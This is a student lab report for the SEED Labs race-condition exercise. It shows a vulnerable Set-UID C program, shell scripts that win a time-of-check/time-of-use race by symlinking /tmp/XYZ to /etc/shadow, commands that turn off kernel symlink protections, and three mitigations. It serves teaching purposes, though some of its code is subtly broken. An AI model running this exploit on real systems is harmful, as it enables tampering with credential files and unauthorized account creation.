# SEEDlabs: Race Condition Vulnerability Lab

#### Ozgur Ural
#### Student ID: 2564455


## 2 Lab Tasks

### 2.1 Turning Off Countermeasures
You can achieve that using the following command:

```sh
$ sudo sysctl -w fs.protected_symlinks=0
$ sudo sysctl fs.protected_regular=0
```

### 2.2 A Vulnerable Program
The following program is a seemingly harmless program. It contains a race-condition vulnerability.

```sh
/* vulp.c */
#include <stdio.h>
#include <unistd.h>
int main()
{ 
  char *fn = "/tmp/XYZ";
  char buffer[60];FILE *fp;
  /* get user input */
  scanf("%50s", buffer );
  if (!access(fn, W_OK))
  {
    fp = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp);
  }
  else printf("No permission \n");
}
```

### 2.3 Task 1: Exploit the Race Condition Vulnerabilities
You need to exploit the race condition vulnerability in the above Set-UID program. More specifically, you 
need to add a line “cs532-lab” to the end of /etc/shadow by using the race. Please also explain why your 
attack can success.
Actually, if you are able to modify the shadow file, you can use the same attack to modify the /etc/passwd 
file. As a result, you are be able to create any kind of accounts for the OS.

Our attack script:

```sh
#!/bin/sh
# attack.sh
race()
{
	old=`ls -l /etc/shadow`
	old=`ls -l /etc/shadow`
	while [ "$old"="$new" ]
	do
		rm -f /tmp/XYZ
		>/tmp/XYZ
		ln -sf /etc/shadow /tmp/XYZ
		new=`ls -l /etc/shadow`
	done
}

race
echo "Stop... The shadow has been changed!"
RACE_PID=$!
kill $RACE_PID
```

Loop execution script:

```sh
#!/bin/sh
# loop.sh
race()
{
	while true
	do
		./vulp < attack_input
	done
}

race
RACE_PID=$!
kill $RACE_PID
```

Content in attack_input:

```sh
cs532-lab
```

Now, let's attack it.

```sh
[11/03/21]seed@VM:~/race-cond-lab$ ls -al
total 32
drwxrwxr-x  2 seed seed 4096 Nov  3 15:29 .
drwxr-xr-x 29 seed seed 4096 Nov  3 15:10 ..
-rwsr-xr-x  1 root root   10 Nov  3 15:10 attack_input
-rwsr-xr-x  1 root root  280 Nov  3 15:07 attack.sh
-rwsr-xr-x  1 root root  110 Nov  3 15:08 loop.sh
-rwsr-xr-x  1 root root 7628 Nov  2 21:18 vulp
-rw-r--r--  1 root root  356 Nov  2 21:18 vulp.c
[11/04/21]seed@VM:~/race-cond-lab$ ./loop.sh ; ./attack.sh
```
Firstly we disabled the symbolic links protection mechanism. Then, we create a vulnerable program. Then we create an explit program which tres to explit the race condition vulnerability by exploiting the gap.Then we create a input file and write a text "cs532-lab". loop.sh is a shell code that takes the input value.After some attempts at exploiting race condition, our attack runs. In this attack, we used the time frame between time of check and time of use ./tmp which is a writeale directory and anyone can write into that. However, only the user can delete or move her files in this directory. So in this lab, we turn off the symlinks protection so that a user can follow the symbolic link.  

### 2.4 Task 2: Protection Mechanism A: Repeating
Getting rid of race conditions is not easy, because the check-and-use pattern is often necessary in 
programs. Instead of removing race conditions, we can actually add more race conditions, such that to 
compromise the security of the program, attackers need to win all these race conditions. If these race 
conditions are designed properly, we can exponentially reduce the winning probability for attackers. The 
basic idea is to repeat access() and fopen() for several times.
Please use this strategy to modify the vulnerable program and repeat your attack. Report how difficult it is 
to succeed, if you can still succeed.

```sh
//vulp2.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
int main()
{
  char *fn = "/tmp/XYZ";
  char buffer[60];
  FILE *fp, *fp2, *fp3;
  struct stat s1,s2,s3;

  /* get user input */
  scanf("%50s", buffer );
  if (!access(fn, W_OK))
  {
    fp = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp);
  }
  else printf("No permission \n");
  
  if (!access(fn, W_OK))
  {
    fp2 = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp2);
    fwrite(buffer, sizeof(char), strlen(buffer), fp2);
  }
  else printf("No permission \n");

  if (!access(fn, W_OK))
  {
    fp3 = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp3);
    fwrite(buffer, sizeof(char), strlen(buffer), fp3);
  }
  else printf("No permission \n");

  fstat(fp, &s1);
  fstat(fp2, &s2);
  fstat(fp3, &s3);

  if((s1.st_ino == s2.st_ino)&&(s2.st_ino == s3.st_ino))
  {
    write(fp, "\n", 2);
    write(fp, buffer, strlen(buffer));
    close(fp);
    close(fp2);
    close(fp3);
  }
  else
  {
    fprintf(stderr, "Permission Denied\n");
    return -1;
  }
}
```

In this task, we change the vulnerable program as you can see above, and perform the same task.The attack does not work. Probably, there exsist a protection mechanim that repeated checks for access and open. 

### 2.5 Task 3: Protection Mechanism B: Principle of Least Privilege
The fundamental problem of the vulnerable program in this lab is the violation of the Principle of Least 
Privilege. The programmer does understand that the user who runs the program might be too powerful, 
so he/she introduced access() to limit the user’s power. However, this is not the proper approach. A better
approach is to apply the Principle of Least Privilege; namely, if users do not need certain privilege, the 
privilege needs to be disabled.
We can use seteuid() system call to temporarily disable the root privilege, and later enable it if necessary. 
Please use this approach to fix the vulnerability in the program, and then repeat your attack. Will you be 
able to succeed? Please report your observations and explanation.

```sh
/* vulp3.c */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main()
{ 
  char *fn = "/tmp/XYZ";
  char buffer[60];
  FILE *fp;
  /* get user input */
  uid_t euid = geteuid();
  uid_t uid = getuid();
  seteuid(uid);
  if (!access(fn, W_OK))
  {
    fp = fopen(fn, "a+");
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp); 
    fclose(fp);
  }
  seteuid(euid);
}
```

The above vulnerable progrm shows that we downgrade the privieges befroe the checks and then revise the privileges at the end of the program. If we try the same attack again, it doesn't work.


### 2.6 Task 4: Protection Mechanism C: Ubuntu’s Built-in Scheme
As we mentioned in the initial setup, comes with a built-in protection scheme against race condition 
attacks.
In this task, you need to turn the protection back on using the following command:
```sh
$ sudo sysctl -w fs.protected_symlinks=1
```
In your report, please describe your observations. Please also explain why does this protection scheme 
work?

After we turn on the sticky bit protection and perform th same attack, the attack is not successful as we cannot follow symlinks from the /tmp directory. The protection scheme worked since in this case, the follower is root, and owner of the /tmp directory is root and the symlink owner is seed. From the above screenshot, it can be
observed that access will be denied. This isn’t a good protection mechanism as this has a few limitations. The mechanism works only for sticky bit directories like /tmp or /var/tmp. So the attacker can exploit the
race condition in other directories and gain access. Firstly, it works only for directories where sticky bit is enabled. Secondly, the protection mechanism denies access only in a couple of cases as shown as in the above screenshot. In case 5 where the follower is root, the owner of the directory is seed and symlink owner is seed. The attack is successful in that case. This can be exploited and race condition would work in a directory owned by root
and root owned file can be modified.

